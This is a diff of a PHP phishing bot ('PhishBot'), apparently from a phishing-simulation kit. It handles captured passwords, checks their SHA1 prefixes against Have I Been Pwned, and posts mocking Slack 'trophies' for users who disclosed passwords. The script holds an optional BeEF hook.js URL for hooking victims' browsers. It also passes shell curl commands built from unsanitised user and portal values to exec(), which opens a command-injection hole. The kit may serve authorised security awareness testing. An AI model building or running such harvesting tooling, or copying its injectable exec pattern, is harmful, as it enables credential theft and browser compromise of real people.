@@ -9,7 +9,7 @@ $slackbotname = "PhishBot";
 $SlackLegacyToken = "YOUR_SLACK_LEGACY_TOKEN_OR_SLACKBOT_TOKEN_HERE";
 
 // Set Optional BEEF Hook URL
-//$BEEFUrl = "https://pondurancelab.com:3000/hook.js";
+//$BEEFUrl = "https://YOUR_DOMAIN_HERE.com:3000/hook.js";
 $BEEFUrl = "";
 
 // Receives Required Parameters and Sets Variables
@@ -53,19 +53,18 @@ $resulttrophy = $conn->query($sqltrophy);
 while($row = $resulttrophy->fetch_assoc()) {
 
 if($row["Title"] == "MostDedicated"){
-$cmdtrophy = "curl -F file=@awardgifs/TrophyMostDedicated.gif -F 'initial_comment=".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
-echo $cmdtrophy;
+$cmdtrophy = "curl -F file=@awardgifs/TrophyMostDedicated.gif -F 'initial_comment=Third Times a Charm! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
 exec($cmdtrophy);
 }
 
 
 if($row["Title"] == "MostDelayed"){
-$cmdtrophy = "curl -F file=@awardgifs/TrophyMostDelayed.gif -F 'initial_comment=".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
+$cmdtrophy = "curl -F file=@awardgifs/TrophyMostDelayed.gif -F 'initial_comment=Partys over! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
 exec($cmdtrophy);
 }
 
 if($row["Title"] == "MostDisclosedPWs"){
-$cmdtrophy = "curl -F file=@awardgifs/TrophyMostDisclosed.gif -F 'initial_comment=".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
+$cmdtrophy = "curl -F file=@awardgifs/TrophyMostDisclosed.gif -F 'initial_comment=Here Try This One.. - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
 exec($cmdtrophy);
 }
 
@@ -159,13 +158,28 @@ exec($cmd2);
 exec($cmd2,$pwned);
 
 $pwnedarray = array();
+$arraywithcount = array();
 
 foreach($pwned as $pwned2){
+//array_push($pwnedarray, array(substr($pwned2, 0, strrpos($pwned2, ':')), substr($pwned2, 1, strrpos($pwned2, ':'))));
+$pos = strpos($pwned2, ":");
+$shahash = substr($pwned2, 0, strrpos($pwned2, ':'));
+$hashcount = substr($pwned2, $pos + 1);
+$arraywithcount[$shahash] = $hashcount;
 $pwnedarray[] = substr($pwned2, 0, strrpos($pwned2, ':'));
 }
 
 if (in_array(substr($sha1pass, 5), $pwnedarray)) {
     $TroyHunt = "yes";
+
+$haveibeenpwnedhits = $arraywithcount[substr($sha1pass, 5)];
+
+// If the Password is so non-unique, give a Trophy
+if ($haveibeenpwnedhits >= "500"){
+$cmdtrophy = "curl -F file=@awardgifs/TrophyLeastUniquePassword.gif -F 'initial_comment=That PW Gets Around.. - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
+exec($cmdtrophy);
+}
+
 } else $TroyHunt = "no";
 
 // If the Password is Set, Change Slack Message
